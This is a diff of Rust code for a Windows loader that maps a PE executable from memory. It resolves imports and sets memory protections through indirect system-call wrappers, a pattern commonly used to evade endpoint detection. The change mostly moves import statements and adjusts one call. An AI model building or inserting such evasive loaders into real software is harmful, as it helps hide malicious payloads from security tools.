@@ -18,15 +18,6 @@ use winapi::um::winnt::{
     MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY,
     PAGE_READWRITE,
 };
-use crate::syscalls::{
-    indirect_syscall_ldrloaddll,
-    indirect_syscall_ntallocatevirtualmemory,
-    indirect_syscall_ntprotectvirtualmemory,
-    indirect_syscall_ldrgetprocedureaddress,
-    indirect_syscall_ntflushinstructioncache,
-};
-use std::ffi::c_void;
-use winapi::um::processthreadsapi::GetCurrentProcess;
 
 // PE Header structures
 #[repr(C)]
@@ -127,6 +118,9 @@ unsafe fn get_data_directory(nt_headers: *const ImageNtHeaders64, index: usize) 
 
 #[cfg(windows)]
 unsafe fn set_section_permissions(image_base: *mut u8, section: &ImageSectionHeader) -> Result<(), String> {
+    use crate::syscalls::indirect_syscall_ntprotectvirtualmemory;
+    use std::ffi::c_void;
+    use winapi::um::processthreadsapi::GetCurrentProcess;
     let characteristics = section.characteristics;
     let mut protect = PAGE_READONLY;
     if (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 {
@@ -192,6 +186,8 @@ unsafe fn process_relocations(image_base: *mut u8, nt_headers: *const ImageNtHea
 
 #[cfg(windows)]
 unsafe fn resolve_imports(image_base: *mut u8, nt_headers: *const ImageNtHeaders64) -> Result<(), String> {
+    use crate::syscalls::{indirect_syscall_ldrloaddll, indirect_syscall_ldrgetprocedureaddress};
+use winapi::shared::ntdef::{UNICODE_STRING, ANSI_STRING};
     let import_dir = get_data_directory(nt_headers, IMAGE_DIRECTORY_ENTRY_IMPORT);
     if (*import_dir).virtual_address == 0 {
         return Ok(());
@@ -203,7 +199,7 @@ unsafe fn resolve_imports(image_base: *mut u8, nt_headers: *const ImageNtHeaders
         let mut module = ptr::null_mut();
         let mut dll_name_unicode = dll_name.to_str().unwrap().encode_utf16().collect::<Vec<u16>>();
         dll_name_unicode.push(0);
-        let mut us = winapi::shared::ntdef::UNICODE_STRING {
+        let mut us = UNICODE_STRING {
             Length: ((dll_name_unicode.len() - 1) * 2) as u16,
             MaximumLength: (dll_name_unicode.len() * 2) as u16,
             Buffer: dll_name_unicode.as_mut_ptr(),
@@ -230,7 +226,13 @@ unsafe fn resolve_imports(image_base: *mut u8, nt_headers: *const ImageNtHeaders
             } else {
                 let import_by_name = image_base.add(*thunk_ref as usize) as *const ImageImportByName;
                 let func_name_ptr = &(*import_by_name).name as *const u8 as *const i8;
-                indirect_syscall_ldrgetprocedureaddress(module, func_name_ptr as *const u8, 0, &mut func_addr);
+                let func_name_cstr = std::ffi::CStr::from_ptr(func_name_ptr);
+                let mut ansi_string = ANSI_STRING {
+                    Length: func_name_cstr.to_bytes().len() as u16,
+                    MaximumLength: func_name_cstr.to_bytes().len() as u16,
+                    Buffer: func_name_ptr as *mut i8,
+                };
+                indirect_syscall_ldrgetprocedureaddress(module, &mut ansi_string, 0, &mut func_addr);
             };
             if func_addr.is_null() {
                 return Err(format!("Failed to import function (error: {})", GetLastError()));
@@ -266,6 +268,8 @@ unsafe fn process_tls_callbacks(image_base: *mut u8, nt_headers: *const ImageNtH
 
 #[cfg(windows)]
 unsafe fn finalize_sections(image_base: *mut u8, nt_headers: *const ImageNtHeaders64) -> Result<(), String> {
+    use crate::syscalls::indirect_syscall_ntflushinstructioncache;
+    use winapi::um::processthreadsapi::GetCurrentProcess;
     let section_header_ptr = (nt_headers as *const ImageNtHeaders64 as usize
         + mem::size_of::<u32>()
         + mem::size_of::<ImageFileHeader>()
@@ -284,6 +288,9 @@ unsafe fn finalize_sections(image_base: *mut u8, nt_headers: *const ImageNtHeade
 
 #[cfg(windows)]
 unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
+    use crate::syscalls::indirect_syscall_ntallocatevirtualmemory;
+    use std::ffi::c_void;
+    use winapi::um::processthreadsapi::GetCurrentProcess;
     if pe_data.len() < mem::size_of::<ImageDosHeader>() {
         return Err("PE data is too small for DOS header".to_string());
     }
